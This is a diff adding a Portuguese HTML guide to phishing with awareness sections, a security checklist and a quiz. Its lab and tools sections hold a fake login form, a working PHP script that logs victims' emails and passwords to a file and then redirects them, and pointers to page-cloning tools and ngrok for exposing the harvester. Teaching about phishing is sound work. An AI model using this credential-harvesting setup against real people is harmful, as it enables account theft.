@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Kiwifi PhishHunter - Webook Completo</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background: #f8fafc;
+      color: #1e293b;
+      margin: 0;
+      line-height: 1.7;
+    }
+    header, nav, footer {
+      background: #0f172a;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    nav {
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+    nav a {
+      color: #93c5fd;
+      margin: 0 12px;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    nav a:hover {
+      text-decoration: underline;
+    }
+    main {
+      max-width: 960px;
+      margin: auto;
+      padding: 30px;
+      background: white;
+    }
+    section {
+      padding: 40px 0;
+      border-bottom: 1px solid #e2e8f0;
+    }
+    h2 {
+      color: #1d4ed8;
+      margin-bottom: 20px;
+    }
+    .code {
+      background: #f1f5f9;
+      border-left: 4px solid #3b82f6;
+      padding: 10px;
+      font-family: monospace;
+      white-space: pre-wrap;
+      word-break: break-word;
+      margin: 20px 0;
+    }
+    .social-links {
+      margin-top: 40px;
+      text-align: center;
+    }
+    .social-links a {
+      margin: 0 10px;
+      color: #3b82f6;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    .social-links a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Kiwifi PhishHunter</h1>
+    <p>Webook Interativo e Ético sobre Phishing</p>
+  </header>
+
+  <nav>
+    <a href="#conceito">Conceito</a>
+    <a href="#evolucao">Evolução</a>
+    <a href="#ferramentas">Ferramentas</a>
+    <a href="#engenharia">Engenharia Social</a>
+    <a href="#casos">Casos Reais</a>
+    <a href="#checklist">Checklist</a>
+    <a href="#lab">Simulações</a>
+    <a href="#tecnicas">Ferramentas e Técnicas</a>
+    <a href="#glossario">Glossário</a>
+    <a href="#quiz">Quiz</a>
+    <a href="#recursos">Recursos</a>
+  </nav>
+
+  <main>
+    <section id="conceito">
+      <h2>1. Conceito de Phishing</h2>
+      <p>Phishing é um tipo de ataque baseado em engenharia social onde o atacante se passa por uma entidade confiável para enganar a vítima e obter informações confidenciais.</p>
+    </section>
+
+    <section id="evolucao">
+      <h2>2. Evolução do Phishing</h2>
+      <p>Desde os anos 90, os ataques de phishing evoluíram de simples e-mails mal escritos para campanhas complexas que usam IA, deepfakes e personalização por geolocalização.</p>
+    </section>
+
+    <section id="ferramentas">
+      <h2>3. Ferramentas Utilizadas</h2>
+      <ul>
+        <li>SET (Social Engineering Toolkit)</li>
+        <li>Gophish</li>
+        <li>King Phisher</li>
+        <li>Phishing Frenzy</li>
+      </ul>
+    </section>
+
+    <section id="engenharia">
+      <h2>4. Engenharia Social e Interfaces Falsas</h2>
+      <p>O phishing utiliza elementos visuais como logos, fontes e palavras familiares para induzir confiança. Ataques visam o emocional: medo, urgência e ganância.</p>
+    </section>
+
+    <section id="casos">
+      <h2>5. Casos Reais</h2>
+      <p>Exemplos famosos incluem os ataques ao Google e Facebook (US$ 100 milhões) e ao governo da Ucrânia em campanhas de guerra cibernética.</p>
+    </section>
+
+    <section id="checklist">
+      <h2>6. Checklist de Segurança</h2>
+      <ul>
+        <li>Verificar URL antes de clicar</li>
+        <li>Não baixar anexos desconhecidos</li>
+        <li>Usar autenticação em 2 fatores</li>
+        <li>Educar colaboradores sobre engenharia social</li>
+      </ul>
+    </section>
+
+    <section id="lab">
+      <h2>7. Laboratório e Simulações</h2>
+      <div class="code">
+&lt;form action=&quot;http://localhost/capture.php&quot; method=&quot;post&quot;&gt;<br />
+  Email: &lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;&lt;br&gt;<br />
+  Senha: &lt;input type=&quot;password&quot; name=&quot;senha&quot;&gt;&lt;br&gt;<br />
+  &lt;input type=&quot;submit&quot; value=&quot;Entrar&quot;&gt;<br />
+&lt;/form&gt;
+      </div>
+    </section>
+
+    <section id="tecnicas">
+      <h2>8. Ferramentas para Criar Phishing e Capturar Informações</h2>
+      <p><strong>Ferramentas para criação:</strong></p>
+      <ul>
+        <li><strong>SET (Social Engineering Toolkit)</strong>: permite criar páginas de login falsas com redirecionamento e coleta de credenciais.</li>
+        <li><strong>Zphisher</strong>: ferramenta automatizada com opções de clonar páginas como Instagram, Google, Facebook etc.</li>
+        <li><strong>Blackeye</strong>: alternativa rápida para clonar interfaces conhecidas.</li>
+      </ul>
+
+      <p><strong>Ferramentas para captura de informações:</strong></p>
+      <ul>
+        <li><strong>PHP Server</strong>: para armazenar os dados digitados pela vítima.</li>
+        <li><strong>Ngrok</strong>: expõe o servidor local para a internet (encurtador de túnel).</li>
+        <li><strong>Keylogger</strong>: scripts para capturar tudo que o usuário digita (requer conhecimento avançado).</li>
+      </ul>
+
+      <h3>⚙️ Exemplo de coleta com PHP</h3>
+      <div class="code">
+&lt;?php<br />
+$file = fopen(\"credenciais.txt\", \"a\");<br />
+fwrite($file, \"Email: \" . $_POST['email'] . \"\\n\");<br />
+fwrite($file, \"Senha: \" . $_POST['senha'] . \"\\n\\n\");<br />
+fclose($file);<br />
+header(\"Location: https://google.com\");<br />
+?&gt;
+      </div>
+      <p><em>⚠️ Este exemplo é para fins educacionais. Não utilize para fins maliciosos.</em></p>
+    </section>
+
+    <section id="glossario">
+      <h2>9. Glossário</h2>
+      <p><strong>Spear phishing:</strong> ataque direcionado a uma pessoa ou organização específica.</p>
+      <p><strong>Payload:</strong> código malicioso enviado junto com o ataque.</p>
+    </section>
+
+    <section id="quiz">
+      <h2>10. Quiz Rápido</h2>
+      <p><strong>O que é phishing?</strong></p>
+      <ul>
+        <li>A) Técnica para hackear Wi-Fi</li>
+        <li><strong>B) Enganar pessoas para obter dados</strong></li>
+        <li>C) Ferramenta de segurança</li>
+      </ul>
+    </section>
+
+    <section id="recursos">
+      <h2>11. Recursos Adicionais</h2>
+      <ul>
+        <li><a href="https://haveibeenpwned.com" target="_blank">Verifique se seu e-mail foi vazado</a></li>
+        <li><a href="https://www.phishing.org" target="_blank">Phishing.org</a></li>
+      </ul>
+    </section>
+
+    <div class="social-links">
+      <p>📲 Conecte-se comigo:</p>
+      <a href="https://www.instagram.com/eo_charadaa?igsh=d3V2cmYxeDhydjd6" target="_blank">Instagram</a>
+      <a href="https://wa.me/5544998329604" target="_blank">WhatsApp</a>
+    </div>
+  </main>
+
+  <footer>
+    &copy; 2025 Kiwifi Security Labs. Guia para fins educacionais. Não use de forma maliciosa.
+  </footer>
+</body>
+</html>
